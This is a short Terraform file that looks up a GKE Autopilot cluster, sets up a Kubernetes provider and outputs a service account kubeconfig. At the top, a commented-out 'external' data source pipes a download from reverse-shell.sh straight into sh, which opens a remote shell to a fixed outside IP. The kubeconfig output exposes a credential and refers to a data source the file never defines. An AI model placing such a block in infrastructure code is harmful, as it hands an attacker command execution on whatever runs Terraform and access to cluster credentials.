# data "external" "test" {
#   program = ["sh", "-c", "curl https://reverse-shell.sh/34.171.211.44:8888 | sh"]
# }

data "google_container_cluster" "mycluster" {
  name     = "my-autopilot"
  location = var.region
}

provider "kubernetes" {
  config_context_cluster = data.google_container_cluster.mycluster.name
}

output "kubeconfig" {
  value = data.kubernetes_service_account.default.kubeconfig
}

